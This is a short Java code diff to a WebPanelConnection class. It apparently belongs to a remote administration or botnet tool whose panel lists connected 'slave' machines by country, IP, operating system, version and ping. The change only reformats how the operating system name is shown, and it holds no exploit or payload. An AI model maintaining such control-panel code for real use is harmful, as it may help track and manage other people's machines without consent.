@@ -52,7 +52,7 @@ public class WebPanelConnection implements Runnable {
                 			slave.isSelected() + "",
                 			slave.getCountry(),
                 			slave.formatUserString(),
-                			slave.getOperatingSystem() + " " + slave.getOperatingSystem().getArch().getName(),
+                			slave.getOperatingSystem().getDisplayString() + " " + slave.getOperatingSystem().getArch().getName(),
                 			slave.getIP(),
                 			Constants.NAME + " " + slave.getVersion(),
                 			slave.getPing() + "",
@@ -96,7 +96,7 @@ public class WebPanelConnection implements Runnable {
                 	for (int i = 0; i < StatisticsOperatingSystem.getGlobal().getList().size(); i++) {
             			OperatingSystemStatEntry entry = StatisticsOperatingSystem.getGlobal().getList().get(i);
             			try {            				
-            				sb.append(entry.getOperatingSystem().getType().getName() + "," + entry.getConnects());
+            				sb.append(entry.getOperatingSystem().getDisplayString() + "," + entry.getConnects());
             				sb.append(";");
             			} catch (Exception ex) {
             				ex.printStackTrace();
